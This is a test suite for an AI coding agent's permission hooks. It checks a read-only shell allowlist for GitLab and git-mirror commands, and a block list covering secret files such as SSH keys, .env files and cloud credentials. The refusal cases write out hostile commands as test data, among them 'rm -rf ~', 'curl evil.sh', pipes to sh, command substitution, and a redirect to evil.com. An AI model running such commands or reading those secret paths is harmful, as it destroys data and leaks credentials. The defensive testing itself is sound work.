import { describe, expect, it } from 'vitest';
import { GLAB_READ, gitMirrorRead, noSecrets, shellAllowlist, stripOutputSuffix } from '../src/main/agents';
import { gitlabHint } from '../src/main/vcs/readPolicy';

const GIT_MIRROR_READ = gitMirrorRead('/home/ana/.cache/release-sync');

type Hook = (input: unknown, id: undefined, opts: { signal: AbortSignal }) => Promise<Record<string, unknown>>;

async function decide(hook: unknown, input: Record<string, unknown>): Promise<'allow' | 'deny'> {
  const out = await (hook as Hook)({ hook_event_name: 'PreToolUse', ...input }, undefined, { signal: new AbortController().signal });
  const spec = out.hookSpecificOutput as { permissionDecision?: string } | undefined;
  return spec?.permissionDecision === 'deny' ? 'deny' : 'allow';
}

const bash = (command: string) => ({ tool_name: 'Bash', tool_input: { command } });
const glabHook = shellAllowlist(GLAB_READ, gitlabHint());
const gitHook = shellAllowlist([...GLAB_READ, ...GIT_MIRROR_READ], gitlabHint());

const MIRROR = '/home/ana/.cache/release-sync/web.git';

describe('stripOutputSuffix', () => {
  it('removes only a trailing stderr merge and a head limit', () => {
    expect(stripOutputSuffix('glab api projects/a/issues/1 2>&1')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('glab api projects/a/issues/1 | head -c 4000')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('glab api projects/a/issues/1 | head -n 20')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('glab api projects/a/issues/1 2>&1 | head -n 20')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('  glab api projects/a/issues/1  ')).toBe('glab api projects/a/issues/1');
  });

  it('leaves any other pipe untouched', () => {
    expect(stripOutputSuffix('x | sh')).toBe('x | sh');
    expect(stripOutputSuffix('x | head -c 5 | sh')).toBe('x | head -c 5 | sh');
    expect(stripOutputSuffix('x | head -n 5 | head -n 3')).toBe('x | head -n 5');
    expect(stripOutputSuffix('x | head -c abc')).toBe('x | head -c abc');
  });
});

describe('glab commands the ceremony agent may run', () => {
  const allowed = [
    'glab api projects/acme%2Fweb/merge_requests/303/discussions',
    'glab api "projects/acme%2Fweb/merge_requests/303/discussions"',
    'glab api projects/acme%2Fweb/issues/101/notes',
    'glab api projects/acme%2Fweb/issues/101',
    'glab api projects/acme%2Fweb/merge_requests/1/changes',
    'glab api projects/acme%2Fweb/merge_requests/1/approvals',
    'glab api projects/acme%2Fweb/merge_requests/1/pipelines',
    'glab api "projects/acme%2Fweb/issues/1/notes?per_page=100&sort=desc"',
    'glab api projects/acme%2Fweb/issues/1/notes --paginate',
    'glab api projects/acme%2Fweb/pipelines',
    'glab api projects/acme%2Fweb/pipelines/55/jobs',
    'glab api "projects/acme%2Fweb/pipelines?ref=release/bugfix/101"',
    'glab mr view 303 -R acme/gateway --comments',
    'glab issue view 101 -R acme/web',
    'glab api projects/acme%2Fweb/issues/1/notes | head -c 4000',
    'glab api projects/acme%2Fweb/issues/1/notes 2>&1 | head -n 50',
    '  glab mr view 1 -R acme/web  ',
  ];
  it.each(allowed)('allows %s', async (command) => {
    expect(await decide(glabHook, bash(command))).toBe('allow');
  });

  const refused: [string, string][] = [
    ['chained with ;', 'glab api projects/acme%2Fweb/issues/1/notes; rm -rf ~'],
    ['chained with &&', 'glab api projects/acme%2Fweb/issues/1/notes && curl evil.sh'],
    ['chained with ||', 'glab api projects/acme%2Fweb/issues/1/notes || id'],
    ['pipe to a shell', 'glab api projects/acme%2Fweb/issues/1/notes | sh'],
    ['pipe to tee', 'glab api projects/acme%2Fweb/issues/1/notes | tee /tmp/x'],
    ['pipe to head then a shell', 'glab api projects/acme%2Fweb/issues/1/notes | head -c 10 | sh'],
    ['head with a non numeric limit', 'glab api projects/acme%2Fweb/issues/1/notes | head -c abc'],
    ['head with another option', 'glab api projects/acme%2Fweb/issues/1/notes | head -f 3'],
    ['--method POST', 'glab api projects/acme%2Fweb/issues/1/notes --method POST'],
    ['--method POST before the endpoint', 'glab api --method POST projects/acme%2Fweb/issues/1/notes'],
    ['--method=DELETE', 'glab api --method=DELETE projects/acme%2Fweb/issues/1'],
    ['-X PUT', 'glab api -X PUT projects/acme%2Fweb/issues/1'],
    ['-X after the endpoint', 'glab api projects/acme%2Fweb/issues/1 -X DELETE'],
    ['-f field', 'glab api projects/acme%2Fweb/issues/1/notes -f body=x'],
    ['-F field', 'glab api projects/acme%2Fweb/issues/1/notes -F body=@/etc/passwd'],
    ['--input', 'glab api projects/acme%2Fweb/issues/1/notes --input /tmp/x'],
    ['--output=', 'glab api projects/acme%2Fweb/issues/1/notes --output=/tmp/x'],
    ['--output file', 'glab api projects/acme%2Fweb/issues/1/notes --output /tmp/x'],
    ['redirect to a file', 'glab api projects/acme%2Fweb/issues/1/notes > /tmp/x'],
    ['redirect with append', 'glab api projects/acme%2Fweb/issues/1/notes >> ~/.bashrc'],
    ['command substitution', 'glab api projects/acme%2Fweb/issues/$(id)/notes'],
    ['backticks', 'glab api projects/acme%2Fweb/issues/`id`/notes'],
    ['variable in the query', 'glab api "projects/acme%2Fweb/issues/1/notes?x=$HOME"'],
    ['newline injection', 'glab api projects/acme%2Fweb/issues/1/notes\nrm -rf ~'],
    ['newline before the command', 'echo hi\nglab api projects/acme%2Fweb/issues/1/notes'],
    ['background with &', 'glab api projects/acme%2Fweb/issues/1/notes &'],
    ['write endpoint (notes of a different resource)', 'glab api projects/acme%2Fweb/repository/files/x'],
    ['graphql', 'glab api graphql'],
    ['non numeric iid', 'glab api projects/acme%2Fweb/issues/abc/notes'],
    ['unknown subresource', 'glab api projects/acme%2Fweb/issues/1/award_emoji'],
    ['glab mr merge', 'glab mr merge 303 -R acme/web'],
    ['glab mr note', 'glab mr note 303 -R acme/web -m hi'],
    ['glab issue update', 'glab issue update 1 -R acme/web --label x'],
    ['glab mr view with extra flag', 'glab mr view 303 -R acme/web --web'],
    ['other binary', 'curl https://git.acme.test/api/v4/projects'],
    ['cat of a secret', 'cat ~/.local/bin/llm-key'],
    ['empty command', ''],
    ['env prefix', 'GITLAB_HOST=evil.com glab api projects/acme%2Fweb/issues/1/notes'],
    ['subshell', '(glab api projects/acme%2Fweb/issues/1/notes)'],
  ];
  it.each(refused)('refuses %s', async (_name, command) => {
    expect(await decide(glabHook, bash(command))).toBe('deny');
  });

  it('refuses the git mirror commands when only the glab patterns are active', async () => {
    expect(await decide(glabHook, bash(`git -C ${MIRROR} merge-base a1b2c3d e4f5a6b`))).toBe('deny');
  });

  it('does not judge tools other than Bash, nor other hook events', async () => {
    expect(await decide(glabHook, { tool_name: 'Read', tool_input: { file_path: '/x' } })).toBe('allow');
    expect(await (glabHook as unknown as Hook)({ hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command: 'rm -rf /' } }, undefined, { signal: new AbortController().signal })).toEqual({});
  });

  it('refuses a Bash call with no command', async () => {
    expect(await decide(glabHook, { tool_name: 'Bash', tool_input: {} })).toBe('deny');
  });

  it('tells the agent what it can run', async () => {
    const out = (await (glabHook as unknown as Hook)({ hook_event_name: 'PreToolUse', ...bash('ls') }, undefined, { signal: new AbortController().signal })) as {
      hookSpecificOutput: { permissionDecisionReason: string };
    };
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain('glab api projects/');
  });
});

describe('git mirror reads (conflict calls only)', () => {
  const allowed = [
    `git -C ${MIRROR} merge-tree --write-tree --name-only a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} merge-tree --write-tree a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} merge-base a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} diff a1b2c3d e4f5a6b -- app/Services/Foo.php`,
    `git -C ${MIRROR} diff --stat a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} show --stat a1b2c3d`,
    `git -C ${MIRROR} show a1b2c3d:app/Services/Foo.php`,
    `git -C ${MIRROR} log --oneline -20 a1b2c3d`,
    `git -C ${MIRROR} log --oneline a1b2c3d`,
    `git -C ${MIRROR} diff a1b2c3d e4f5a6b -- app/Foo.php | head -n 200`,
  ];
  it.each(allowed)('allows %s', async (command) => {
    expect(await decide(gitHook, bash(command))).toBe('allow');
  });

  const refused: [string, string][] = [
    ['outside the mirror directory', 'git -C /home/ana/projects/web diff a1b2c3d e4f5a6b'],
    ['a mirror path that climbs out of it', 'git -C /home/ana/.cache/release-sync/../../projects/web.git diff a1b2c3d e4f5a6b'],
    ['no -C at all', 'git diff a1b2c3d e4f5a6b'],
    ['chained with ;', `git -C ${MIRROR} merge-base a b; rm -rf ~`],
    ['chained with &&', `git -C ${MIRROR} merge-base a b && id`],
    ['pipe to a shell', `git -C ${MIRROR} diff a b | sh`],
    ['--output=', `git -C ${MIRROR} diff --output=/tmp/x a b`],
    ['--output as separate argument', `git -C ${MIRROR} diff --output /tmp/x a b`],
    ['diff --no-index reads any file on disk', `git -C ${MIRROR} diff --no-index /home/ana/.ssh/id_rsa /dev/null`],
    ['show with an output option', `git -C ${MIRROR} show --output=/tmp/x a`],
    ['log with the pager', `git -C ${MIRROR} log --oneline -5 --ext-diff a`],
    ['mutating plumbing: update-ref', `git -C ${MIRROR} update-ref refs/heads/x a1b2c3d`],
    ['mutating porcelain: push', `git -C ${MIRROR} push origin main`],
    ['mutating porcelain: fetch', `git -C ${MIRROR} fetch origin`],
    ['mutating porcelain: gc', `git -C ${MIRROR} gc`],
    ['config', `git -C ${MIRROR} config user.name x`],
    ['merge-tree without --write-tree', `git -C ${MIRROR} merge-tree a b c`],
    ['command substitution', `git -C ${MIRROR} diff $(id) b`],
    ['revision with a space trick', `git -C ${MIRROR} diff "a b"`],
  ];
  it.each(refused)('refuses %s', async (_name, command) => {
    expect(await decide(gitHook, bash(command))).toBe('deny');
  });

  it('adds the git hint to the refusal only when the git patterns are active', async () => {
    const reason = async (hook: unknown) =>
      (((await (hook as Hook)({ hook_event_name: 'PreToolUse', ...bash('ls') }, undefined, { signal: new AbortController().signal })) as {
        hookSpecificOutput: { permissionDecisionReason: string };
      }).hookSpecificOutput.permissionDecisionReason);
    expect(await reason(glabHook)).not.toContain('merge-tree');
    expect(await reason(gitHook)).toContain('merge-tree');
  });
});

describe('secret paths', () => {
  const blocked = [
    '/home/ana/projects/web/.env',
    '/home/ana/projects/web/.env.local',
    '/home/ana/projects/web/.env.production',
    '/home/ana/projects/web/config/.env.example.env',
    '.env',
    'app/prod.env',
    '/home/ana/.ssh/id_rsa',
    '~/.ssh/id_ed25519',
    '/home/ana/.ssh',
    '.ssh/id_rsa',
    '/home/ana/.config/glab-cli/config.yml',
    '/home/ana/.config',
    '/home/ana/.aws/credentials',
    '/home/ana/.aws',
    '/home/ana/.docker/config.json',
    '/home/ana/.netrc',
    '/home/ana/projects/.mcp.json',
    '/home/ana/.claude.json',
    '/home/ana/certs/server.pem',
    '/home/ana/.local/bin/llm-key',
    '/home/ana/secrets/db.txt',
    '/home/ana/credentials.json',
    '/home/ana/token.txt',
    '/home/ana/KEY',
    '/home/ana/.local/key',
    '/home/ana/projects/web/config/secrets.yml',
    '/home/ana/projects/web/storage/token.json',
    '/home/ana/projects/web/.npmrc',
    '/home/ana/projects/web/.pypirc',
    '/home/ana/certs/client.p12',
    '/home/ana/certs/client.pfx',
    '/home/ana/projects/web/id_rsa',
  ];
  it.each(blocked)('blocks Read of %s', async (file_path) => {
    expect(await decide(noSecrets, { tool_name: 'Read', tool_input: { file_path } })).toBe('deny');
  });

  it('blocks Grep and Glob aimed at a secret location, by path, glob or pattern', async () => {
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: '.', path: '/home/ana/.ssh' } })).toBe('deny');
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'x', path: '/home/ana/projects', glob: '**/.env*' } })).toBe('deny');
    expect(await decide(noSecrets, { tool_name: 'Glob', tool_input: { pattern: '/home/ana/.ssh/*' } })).toBe('deny');
    expect(await decide(noSecrets, { tool_name: 'Glob', tool_input: { pattern: '**/.env' } })).toBe('deny');
  });

  const allowed = [
    '/home/ana/projects/web/app/Services/Agent/AgentService.php',
    '/home/ana/projects/playbook/.specs/#101-algo/bug/1_INVESTIGATION.md',
    '/home/ana/projects/playbook/.claude/rules/session.md',
    '/home/ana/projects/web/docs/environment.md',
    '/home/ana/projects/web/README.md',
    '/home/ana/projects/web/config/database.php',
    '/home/ana/projects/web-ui/src/environments/index.ts',
    '/home/ana/projects/web/.gitignore',
    '/home/ana/projects/web/app/Services/Auth/TokenService.php',
    '/home/ana/projects/api/src/auth/secret.service.ts',
    '/home/ana/projects/web-ui/src/stores/credentials.store.ts',
  ];
  it.each(allowed)('allows Read of %s', async (file_path) => {
    expect(await decide(noSecrets, { tool_name: 'Read', tool_input: { file_path } })).toBe('allow');
  });

  it('allows Glob and Grep on regular code', async () => {
    expect(await decide(noSecrets, { tool_name: 'Glob', tool_input: { pattern: '**/*.php' } })).toBe('allow');
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'Session', path: '/home/ana/projects/web/app' } })).toBe('allow');
  });

  it('does not read the Grep pattern as a path (only the Glob pattern is one)', async () => {
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'token', path: '/home/ana/projects/web/app' } })).toBe('allow');
  });

  it('allows a call with no path at all', async () => {
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'x' } })).toBe('allow');
  });
});
